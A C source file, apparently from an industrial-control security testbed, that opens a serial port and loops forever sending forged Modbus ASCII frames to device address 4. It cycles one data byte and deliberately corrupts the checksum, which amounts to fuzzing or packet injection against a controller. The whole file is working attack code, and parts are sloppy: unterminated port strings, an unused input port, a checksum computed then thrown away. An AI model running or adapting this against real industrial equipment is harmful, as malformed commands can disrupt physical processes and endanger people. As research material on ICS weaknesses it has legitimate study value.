#define FORLINUX

#include "modbus.h"
#include "modbus_attack.h"

void device(int rtu, struct timespec req, struct timespec rem);

void sendmodbus_ascii_crc(int port, struct modbus_pdu *pdu) {
  int i, len;

  char *str;

  str = malloc(2*(pdu->datalen+3));
  len = pdu2ascii_crc(pdu, str);

  pdu->crc[0] = 0xff;
  pdu->crc[1] = 0xff;

  sendbyte(port, ASCII_COLON); //start byte

  //send the message
  for (i=0;i<len;i++) {
    sendbyte(port, str[i]);
  }

  sendbyte(port, ASCII_CR); //CR followed by LF marks the end of a PDU transmission
  sendbyte(port, ASCII_LF);

  free(str);

  //portflush(port);
  return;
}

int pdu2ascii_crc(struct modbus_pdu *pdu, char *str) {
  int i, j = 0;
  char top, bottom;
  unsigned char crc;

  byte2ascii(pdu->addr, &top, &bottom);
  str[j++] = top;
  str[j++] = bottom;

  byte2ascii(pdu->fc, &top, &bottom);
  str[j++] = top;
  str[j++] = bottom;

  for (i=0;i<pdu->datalen;i++) {
    byte2ascii(pdu->data[i], &top, &bottom);
    str[j++] = top;
    str[j++] = bottom;
  }

  crc = pdulrc(pdu);
  byte2ascii(crc, &top, &bottom);
  str[j++] = 0xff;
  str[j++] = 0xff;

  return j; //return the length of the string
}


int main(int argc, char *argv[]){

  unsigned char  addr, fc, data[256], crc[2];
  int datalen;
  char inport[100], outport[100];
  int i, j, len, err;
  int port;
  struct modbus_pdu *pdu;
  int cnt1, cnt2;

  strcpy(inport,"/dev/ttyUSB2");
  strcpy(outport,"/dev/ttyUSB0");

   for (i=1;i<argc;i++) {
    if (strcmp(argv[i], "-inport") == 0) {
      len = strlen(argv[i+1]);
      if (len > 100) {
         printf("Error: Port name must be less then 100 characters long.\n");
         return(-1);
      };
      strncpy(inport, argv[i+1],len);
      i++;
      printf("INFO: Input port = %s\n", inport);
    } else if (strcmp(argv[i], "-outport") == 0) {
      len = strlen(argv[i+1]);
      if (len > 100) {
         printf("Error: Port name must be less then 100 characters long.\n");
         return(-1);
      }
      strncpy(outport, argv[i+1],len);
      i++;
    } else {
      printf("ERROR: Illegal argument (%s)\n", argv[i]);
      printf("Usage: %s -inport /dev/ttyXX -outport /dev/ttyYY\n", argv[0]);
      return (-1);
    }
  }

 port = openport(outport);
  if (port < 0) {
   return (port);
  }
  printf("open %s ok port = %d\n", outport, port);
  
  char *str;
  unsigned char lrc, top, bottom;

  addr = (unsigned char) 0x04;
  fc = (unsigned char) 0x03;
  while(1){
   for(cnt1=0x00; cnt1<0xff; cnt1++){
    datalen = 19;
    data[0] = 0x12;
    data[1] = 0x10;
    data[2] = 0x00;
    data[3] = 0x0e;
    data[4] = 0x00;
    data[5] = 0x0c;
    data[6] = 0x4c;
    data[7] = 0x00;
    data[8] = 0x00;
    data[9] = 0x00;
    data[10] = 0x00;
    data[11] = 0x00;
    data[12] = 0x00;
    data[13] = 0x00;
    data[14] = 0x00;
    data[15] = 0x3e;

    data[16] = cnt1;
    data[17] = 0x00;
    data[18] = 0x00; 
 
    str = malloc(datalen + 2);
    str[0] = addr;
    str[1] = fc;
    memcpy(str+2, data, datalen);   
    lrc = LRC(str,datalen+2);
    free(str);    
    byte2ascii(lrc, &top, &bottom);
    crc[0] = 0x11;
    crc[1] = 0x11;
    pdu = mkpdu(addr, fc, data, datalen, crc);
    sendmodbus_ascii_crc(port, pdu);
    freepdu(pdu);
    printf("number is %d\n", cnt1);
    sleep(2);
 } 
 }
}